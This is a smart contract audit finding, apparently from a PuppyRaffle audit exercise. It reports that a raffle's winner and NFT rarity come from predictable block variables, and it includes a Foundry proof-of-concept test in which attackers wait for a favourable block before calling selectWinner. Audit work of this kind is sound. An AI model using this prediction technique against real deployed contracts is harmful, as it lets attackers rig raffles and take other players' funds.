**Title:**

Poor RNG implementation can be exploited by attackers to choose the winner

**Description:**

The `selectWinner` function implements a RNG for the `winnerIndex` and for the `rarity`, using the hash of 3 global variable:
```javascript
uint256 winnerIndex =
    uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % player.length;
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;

```

These numbers can easily be predicted by anyone before the transaction to be broadcasted, leading to a major vulnerability where malicious actors can call the `selectWinner` function only if they will be selected as a winner. They can also wait for the `rarity` variable to be higher than `LEGENDARY_RARITY`, in order to get minted a rare NFT.

This vulnerability is marked as Medium and not High because it is very unlikely in cases where there a lot of players taking part into the raffle. In fact, the `selectWinner` will be probably called right after the end of `raffleDuration`, and malicious actors will not have the time to wait for `block.timestamp` and `block.difficulty` to match his needs.

However `block.difficulty` can probably be manipulated by Ethereum validators and in this case it would be a critical vulnerability.

**Impact:**

Malicious actors can manipulate raffle outcomes to guarantee winning and farm rare NFTs.

**Proof of Concept:**

Actors:
- Attackers: Malicious users exploiting the poor RNG.

```javascript
    function test_RafflePoorRNG() public playersEntered {
        // A group of two malicious participants are entering the raffle
        address[] memory attackers = new address[](2);
        attackers[0] = attackerOne;
        attackers[1] = attackerTwo;

        // Save attackers' balance before they enter the raffle
        vm.deal(attackerOne, entranceFee * 2);
        uint256 balanceBefore = attackerOne.balance + attackerTwo.balance;

        // Attackers enter the raffle
        vm.prank(attackerOne);
        puppyRaffle.enterRaffle{value: entranceFee * 2}(attackers);

        // Raffle duration ends
        vm.warp(block.timestamp + duration);

        // The attacker waits for the `winnerIndex` to match
        // one of the attackers' addresses
        uint256 winnerIndex = 0;
        uint256 attackerOneIndex = puppyRaffle.getActivePlayerIndex(attackerOne);
        uint256 attackerTwoIndex = puppyRaffle.getActivePlayerIndex(attackerTwo);

        // Here
        while (winnerIndex != attackerOneIndex && winnerIndex != attackerTwoIndex) {
            // Wait next block
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 8);

            // Calculate new winnerIndex
            winnerIndex = uint256(keccak256(abi.encodePacked(
                attackerOne, block.timestamp, block.difficulty
            ))) % 6;
        }

        // Now attackers can select the winner because it will match one of their addresses
        vm.prank(attackerOne);
        puppyRaffle.selectWinner();

        // Check that attackers' balance has increased
        uint256 balanceAfter = attackerOne.balance + attackerTwo.balance;
        assertGt(balanceAfter, balanceBefore);
    }
```

**Recommended Mitigation:**

To generate a random number, the safest way is to use an external oracle.
